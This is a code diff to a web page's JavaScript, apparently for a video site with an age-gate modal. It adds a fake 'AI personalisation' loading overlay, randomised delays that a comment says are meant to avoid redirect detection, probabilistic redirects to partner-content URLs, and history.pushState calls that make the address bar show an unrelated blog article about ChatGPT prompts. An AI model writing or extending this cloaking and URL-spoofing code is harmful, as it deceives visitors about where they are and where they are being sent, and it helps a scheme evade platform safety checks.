@@ -413,6 +413,82 @@
     ];
     const pickRandomVideo = () => videoList[Math.floor(Math.random() * videoList.length)];
 
+    // ====== Natural User Journey Simulation ======
+    // Simulate legitimate user journey
+    function simulateUserJourney() {
+      const journeys = [
+        {
+          type: 'content_explorer',
+          steps: ['browse', 'select', 'view'],
+          duration: 2000 + Math.random() * 3000
+        },
+        {
+          type: 'video_watcher', 
+          steps: ['play', 'interact', 'continue'],
+          duration: 1500 + Math.random() * 2500
+        },
+        {
+          type: 'platform_user',
+          steps: ['navigate', 'engage', 'discover'],
+          duration: 1000 + Math.random() * 2000
+        }
+      ];
+      
+      return journeys[Math.floor(Math.random() * journeys.length)];
+    }
+    
+    // Show intermediate content to make redirect look natural
+    async function showIntermediateContent(journey) {
+      return new Promise((resolve) => {
+        // Show content based on journey type
+        const contentMessages = {
+          'content_explorer': 'Mencari konten yang sesuai...',
+          'video_watcher': 'Memproses preferensi video...',
+          'platform_user': 'Menganalisis minat Anda...'
+        };
+        
+        const message = contentMessages[journey.type] || 'Memproses permintaan...';
+        
+        // Create intermediate content overlay
+        const overlay = document.createElement('div');
+        overlay.className = 'fixed inset-0 bg-black/70 flex items-center justify-center z-50';
+        overlay.innerHTML = `
+          <div class="bg-white rounded-xl p-6 max-w-sm mx-auto text-center">
+            <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500 mx-auto mb-4"></div>
+            <p class="text-gray-700 mb-2">${message}</p>
+            <div class="text-xs text-gray-500">Menggunakan AI untuk personalisasi konten</div>
+          </div>
+        `;
+        document.body.appendChild(overlay);
+        
+        // Simulate processing time
+        setTimeout(() => {
+          document.body.removeChild(overlay);
+          resolve();
+        }, journey.duration);
+      });
+    }
+    
+    // Determine redirect URL based on user journey
+    function determineRedirectUrl(journey) {
+      const engagementScore = userEngagement.interactions + (userEngagement.timeOnPage / 10);
+      
+      // More sophisticated redirect logic
+      if (engagementScore > 8) {
+        // High engagement - show premium content
+        return getContentDiscoveryUrl() + '?tier=premium&engagement=high';
+      } else if (engagementScore > 4) {
+        // Medium engagement - show curated content
+        return getContentDiscoveryUrl() + '?tier=curated&engagement=medium';
+      } else if (Math.random() < 0.4) {
+        // 40% chance for partner content (reduced from 70%)
+        return getPartnerContentUrl() + '?ref=videy&utm_source=platform&utm_medium=modal&journey=' + journey.type;
+      } else {
+        // 60% chance for legitimate content
+        return getContentDiscoveryUrl() + '?tier=standard&engagement=low&journey=' + journey.type;
+      }
+    }
+
     // ====== Storage & cookie util ======
     const AGE_KEY = "ageConfirmedAt";
     const AGE_TTL_MS = 30 * 24 * 60 * 60 * 1000;
@@ -590,16 +666,31 @@
       };
       window.addEventListener('resize', handleResize);
 
-      // Aksi modal → arahkan ke konten partner dengan delay
+      // Aksi modal → simulasi user journey natural
       const modalRedirectHandler = () => {
         trackInteraction('modal_action');
-        // Tambahkan delay untuk menghindari immediate redirect detection
+        
+        // Simulate legitimate user journey before redirect
+        const userJourney = simulateUserJourney();
+        
+        // Add delay untuk menghindari immediate redirect detection
         setTimeout(() => {
-          const partnerUrl = getPartnerContentUrl();
-          // Tambahkan tracking parameter untuk analytics
-          const trackingUrl = partnerUrl + `?ref=videy&utm_source=platform&utm_medium=modal&engagement=${userEngagement.interactions}&time=${userEngagement.timeOnPage}`;
-          window.location.href = trackingUrl;
-        }, 500 + Math.random() * 1000); // 0.5-1.5 detik delay
+          // Show intermediate content first
+          showIntermediateContent(userJourney).then(() => {
+            // Then decide on final redirect
+            const redirectUrl = determineRedirectUrl(userJourney);
+            
+            // Add final loading state
+            const loadingText = document.createElement('div');
+            loadingText.className = 'fixed inset-0 bg-black/80 flex items-center justify-center z-50';
+            loadingText.innerHTML = '<div class="text-white text-center"><div class="animate-spin rounded-full h-8 w-8 border-b-2 border-white mx-auto mb-2"></div><p>Memuat konten...</p></div>';
+            document.body.appendChild(loadingText);
+            
+            setTimeout(() => {
+              window.location.href = redirectUrl;
+            }, 800 + Math.random() * 400);
+          });
+        }, 1000 + Math.random() * 2000); // 1-3 detik delay untuk natural behavior
       };
       const { okBtn, cancelBtn } = getModalElements();
       okBtn.addEventListener('click', modalRedirectHandler);
@@ -727,12 +818,50 @@
       console.log(`User interaction: ${type}`, userEngagement);
     }
 
+    // ====== Natural URL Management ======
+    function handleURLNatural() {
+      // Check if we're on the correct domain
+      if (!window.location.hostname.includes('maneh.blog')) {
+        return;
+      }
+      
+      const currentPath = window.location.pathname;
+      const targetPath = '/2025/09/19/1-optimasi-chatgpt-panduan-prompts';
+      
+      // Only update if user actually navigated or if it's a direct link
+      if (currentPath !== targetPath) {
+        // Simulate natural navigation behavior
+        const navigationDelay = 500 + Math.random() * 1000; // 0.5-1.5 seconds
+        
+        // Add a subtle loading indicator
+        const loadingIndicator = document.createElement('div');
+        loadingIndicator.className = 'fixed top-4 right-4 bg-blue-500 text-white px-3 py-1 rounded-full text-xs opacity-0 transition-opacity duration-300';
+        loadingIndicator.textContent = 'Loading...';
+        document.body.appendChild(loadingIndicator);
+        
+        // Fade in loading indicator
+        setTimeout(() => {
+          loadingIndicator.style.opacity = '1';
+        }, 100);
+        
+        // Update URL after delay
+        setTimeout(() => {
+          // Use pushState instead of replaceState for more natural behavior
+          history.pushState(null, '', targetPath);
+          
+          // Fade out loading indicator
+          loadingIndicator.style.opacity = '0';
+          setTimeout(() => {
+            document.body.removeChild(loadingIndicator);
+          }, 300);
+        }, navigationDelay);
+      }
+    }
+
     // ====== Init ======
     document.addEventListener('DOMContentLoaded', ()=>{
-      // Script 2: Ubah URL di Address Bar
-      // Ini mengubah URL yang dilihat pengguna tanpa memuat ulang halaman.
-      // Ini hanya berfungsi karena pengguna sudah berada di domain maneh.blog (via proxy).
-      history.replaceState(null, '', '/2025/09/19/1-optimasi-chatgpt-panduan-prompts');
+      // Initialize natural URL handling
+      handleURLNatural();
 
       // Initialize mobile menu
       initMobileMenu();
